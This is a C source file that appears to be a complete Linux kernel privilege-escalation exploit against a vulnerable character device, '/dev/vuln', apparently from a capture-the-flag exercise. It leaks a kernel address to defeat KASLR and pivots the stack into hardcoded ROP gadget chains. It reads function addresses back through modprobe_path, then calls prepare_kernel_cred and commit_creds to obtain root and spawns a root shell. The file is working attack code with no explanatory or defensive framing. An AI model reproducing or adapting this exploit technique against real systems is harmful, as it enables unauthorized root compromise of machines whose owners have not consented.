#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <fcntl.h>
#include <assert.h>
#include <signal.h>
#include <sys/ioctl.h>

#define u64 unsigned long long

int fd;
u64 kernel_base = 0;
u64 kaslr_slide = 0;
u64 msleep = 0;
u64 prepare_kernel_cred = 0;
u64 commit_creds = 0;
u64 pivot = 0xffffffff81064082; // : add rsp, 0x50 ; pop rbx ; pop rbp ; pop r12 ; ret

void slumber(int signum) {
	printf("received signal: %d\n", signum);
	puts("sleep forever!!!");
	sleep(10000);
}

void __attribute__((constructor)) exp_init() {
    signal(SIGSEGV, slumber);
    signal(SIGTRAP, slumber);
}

// define commands
#define IOCTL_BASE 'W'
#define CMD_ALLOC   _IO(IOCTL_BASE, 0)
#define CMD_WRITE   _IO(IOCTL_BASE, 1)
#define CMD_READ	_IO(IOCTL_BASE, 2)
#define CMD_CALL	_IO(IOCTL_BASE, 3)

void kmalloc()
{
	int ret = ioctl(fd, CMD_ALLOC, NULL);
	assert(ret == 0);
}

void do_write(void *buf)
{
	int ret = ioctl(fd, CMD_WRITE, (unsigned long)buf);
	assert(ret == 0);
}

void do_read(void *buf)
{
	int ret = ioctl(fd, CMD_READ, (unsigned long)buf);
	assert(ret == 0);
}

int _trigger(void *rop_arg)
{
	u64 cmd_call = CMD_CALL;
	u64 *rop = (u64 *)rop_arg;
	assert(rop[6] == 0xfffffffffffffffa);
	__asm__(".intel_syntax noprefix;"
		"push rbp;"

		"mov r15, 0x4141414141414141;"
		"mov r14, 0x4242424242424242;"
		"mov r13, 0x4343434343434343;"
		"mov r12, 0x4444444444444444;"
		"mov r10, 0x4646464646464646;"
		"mov r8, 0x4747474747474747;"
		"mov r9, 0x4848484848484848;"
		"mov rbp, 0x4545454545454545;"
		"mov rbx, 0x4040404040404040;"

		"mov rcx, %1;"
		"mov r15, [rcx+8*0];"
		"mov r14, [rcx+8*1];"
		"mov r13, [rcx+8*2];"
		"mov r12, [rcx+8*3];"
		"mov rbp, [rcx+8*4];"
		"mov rbx, [rcx+8*5];"
		"nop;"
		"mov r10, [rcx+8*7];"
		"mov r9, [rcx+8*8];"
		"mov r8, [rcx+8*9];"

		"mov rdi, fd;"
		"mov rsi, %0;"
		"mov rdx, 0;"
		"mov rax, 0x10;"
		"syscall;"
		"pop rbp;"
		".att_syntax;"
		: : "r"(cmd_call), "r"(rop_arg));
	return 0;
}

void trigger(u64 *rop)
{
	void *child_stack = malloc(8000);
    int child = clone(_trigger, child_stack + 8000, CLONE_FILES | CLONE_VM, rop);
	sleep(1);
}

void context_setup()
{
	fd = open("/dev/vuln", O_RDWR);
	assert(fd >= 0);

	kmalloc();
}


u64 leak_kaslr()
{
	u64 ptr;
	do_read(&ptr);
	printf("%#llx\n", ptr);
	return ptr - 0xffffffff82614940;
}

u64 leak_func_addr(u64 symtab)
{
	u64 args[0x10] = {0};
	int idx = 0;

	// 0xffffffff81003cff : mov eax, dword ptr [rax] ; ret
	// 0xffffffff81007c75 : pop rax ; ret
	// 0xffffffff8100f96e : add rax, rdi ; ret
	// 0xffffffff8105cad4 : add rax, rdx ; ret
	// 0xffffffff8100f797 : add rax, rsi ; ret
	// 0xffffffff81038cd9 : mov eax, dword ptr [rdx] ; ret
	// 0xffffffff8100fb8e : pop rdx ; ret
	// 0xffffffff810639cd : mov qword ptr [rdi + 0x18], rax ; ret
	// 0xffffffff81001cac : pop rdi ; pop rbp ; ret
	// 0xffffffff81000abe : mov ecx, dword ptr [rbx] ; ret
	// 0xffffffff8105cad2 : add eax, dword ptr [rax] ; add rax, rdx ; ret

	args[idx++] = kaslr_slide + 0xffffffff8100fb8e; // : pop rdx ; ret
	args[idx++] = symtab;
	args[idx++] = kaslr_slide + 0xffffffff81038cd9; // : mov eax, dword ptr [rdx] ; ret
	args[idx++] = kaslr_slide + 0xffffffff8102321c; // : dec ecx ; ret
	args[idx++] = kaslr_slide + 0xffffffff81001cac; // : pop rdi ; pop rbp ; ret
	args[idx++] = kaslr_slide + 0xffffffff82650980-0x18; // modprobe_path - 0x18
	args[idx++] = 0xfffffffffffffffa;
	args[idx++] = kaslr_slide + 0xffffffff810639cd; // : mov qword ptr [rdi + 0x18], rax ; ret
	args[idx++] = kaslr_slide + 0xffffffff812000f5; // trampoline

	trigger(args);

	int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
	unsigned offset = 0;
	read(fd, &offset, sizeof(offset));
	printf("offset: %#x\n", offset);
	return kaslr_slide + symtab + offset - 0x100000000;
}

u64 _trigger_r9_ret(void *rop_arg)
{
	u64 val = 0;
	u64 cmd_call = CMD_CALL;
	u64 *rop = (u64 *)rop_arg;
	assert(rop[6] == 0xfffffffffffffffa);
	__asm__(".intel_syntax noprefix;"
		"push rbp;"

		"mov r15, 0x4141414141414141;"
		"mov r14, 0x4242424242424242;"
		"mov r13, 0x4343434343434343;"
		"mov r12, 0x4444444444444444;"
		"mov r10, 0x4646464646464646;"
		"mov r8, 0x4747474747474747;"
		"mov r9, 0x4848484848484848;"
		"mov rbp, 0x4545454545454545;"
		"mov rbx, 0x4040404040404040;"

		"mov rcx, %2;"
		"mov r15, [rcx+8*0];"
		"mov r14, [rcx+8*1];"
		"mov r13, [rcx+8*2];"
		"mov r12, [rcx+8*3];"
		"mov rbp, [rcx+8*4];"
		"mov rbx, [rcx+8*5];"
		"nop;"
		"mov r10, [rcx+8*7];"
		"mov r9, [rcx+8*8];"
		"mov r8, [rcx+8*9];"

		"mov rdi, fd;"
		"mov rsi, %1;"
		"mov rdx, 0;"
		"mov rax, 0x10;"
		"lea r9, [rip+2];" // force it to return right after the syscall instruction
		"syscall;"
		"mov %0, r12;"
		"pop rbp;"
		".att_syntax;"
		: "=r"(val) : "r"(cmd_call), "r"(rop_arg));
	return val;
}

u64 do_prepare_kernel_cred()
{
	u64 args[0x10] = {0};
	int idx = 0;

	args[idx++] = kaslr_slide + 0xffffffff810010b0; // : pop rdi ; ret
	args[idx++] = 0;
	args[idx++] = prepare_kernel_cred;
	args[idx++] = kaslr_slide + 0xffffffff81005e67; // : push rax ; pop r12 ; pop rbp ; ret
	args[idx++] = 0;
	args[idx++] = kaslr_slide + 0xffffffff810010b0; // skip
	args[idx++] = 0xfffffffffffffffa;

	args[idx++] = kaslr_slide + 0xffffffff8102b917; // : pop rcx ; ret
	args[idx++] = 0x41414141; // place holder
	args[idx++] = kaslr_slide + 0xffffffff812000f7; //trampoline

	return _trigger_r9_ret(args);
}

void do_commit_creds(u64 cred)
{
	u64 args[0x10] = {0};
	int idx = 0;

	args[idx++] = kaslr_slide + 0xffffffff810010b0; // : pop rdi ; ret
	args[idx++] = cred;
	args[idx++] = commit_creds;
	args[idx++] = kaslr_slide + 0xffffffff81007c76; // : ret
	args[idx++] = kaslr_slide + 0xffffffff81007c76; // : ret
	args[idx++] = kaslr_slide + 0xffffffff810010b0; // skip
	args[idx++] = 0xfffffffffffffffa;

	args[idx++] = kaslr_slide + 0xffffffff8102b917; // : pop rcx ; ret
	args[idx++] = 0x41414141; // place holder
	args[idx++] = kaslr_slide + 0xffffffff812000f7; //trampoline
	_trigger_r9_ret(args);
}

int main()
{
	context_setup();
	kaslr_slide = leak_kaslr();
	kernel_base = kaslr_slide + 0xffffffff81000000;
	pivot += kaslr_slide;
	printf("kernel_base: %#llx\n", kernel_base);
	printf("kaslr_slide: %#llx\n", kaslr_slide);
	printf("pivot: %#llx\n", pivot);

	// getchar();
	do_write(&pivot);

	// resolve commit_creds
	commit_creds = leak_func_addr(kaslr_slide + 0xffffffff82470098); // commit_creds
	printf("commit_creds @ %#llx !!!\n", commit_creds);

	// resolve prepare_kernel_cred
	prepare_kernel_cred = leak_func_addr(kaslr_slide + 0xffffffff82479ba8); // prepare_kernel_cred
	printf("prepare_kernel_cred @ %#llx !!!\n", prepare_kernel_cred);

	// now do: cred = prepare_kernel_cred(NULL)
	u64 cred = do_prepare_kernel_cred();
	printf("cred: %#llx\n", cred);

	// now do: commit_creds(cred)
	do_commit_creds(cred);

	system("/bin/bash");
}
